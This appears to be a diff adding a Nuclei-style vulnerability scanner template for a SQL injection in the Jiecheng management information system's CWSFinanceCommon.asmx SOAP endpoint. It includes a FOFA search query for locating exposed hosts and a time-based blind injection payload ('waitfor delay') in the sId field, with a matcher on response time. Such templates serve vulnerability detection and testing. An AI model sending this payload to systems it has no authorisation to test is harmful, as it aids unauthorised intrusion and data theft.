@@ -1,0 +1,29 @@
+
+id: jiecheng-CWSFinanceCommon-sqli
+
+info:
+  name: 捷诚管理信息系统 CWSFinanceCommon.asmx SQL注入漏洞
+  author: fgz
+  severity: high
+  description: '捷诚管理信息系统是一款功能全面，可以支持自营、联营到外柜租赁的管理，其自身带工作流管理工具，能够帮助企业有效的开展内部审批工作。该系统CWSFinanceCommon.asmx 存在sql注入漏洞。黑客可以通过该漏洞获取数据库敏感信息，甚至远控服务器。'
+  tags: 2023,jiecheng,sqli
+  metadata:
+    max-request: 3
+    fofa-query: body="/Scripts/EnjoyMsg.js"
+    verified: true
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx"
+    headers:
+      Content-Type: text/xml; charset=utf-8
+    body: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"\
+      http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\
+      \ xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n\
+      \    <GetOSpById xmlns=\"http://tempuri.org/\">\n      <sId>1';waitfor delay\
+      \ '0:0:5'--+</sId>\n    </GetOSpById>\n  </soap:Body>\n</soap:Envelope>"
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && duration>=5 && duration<=6"
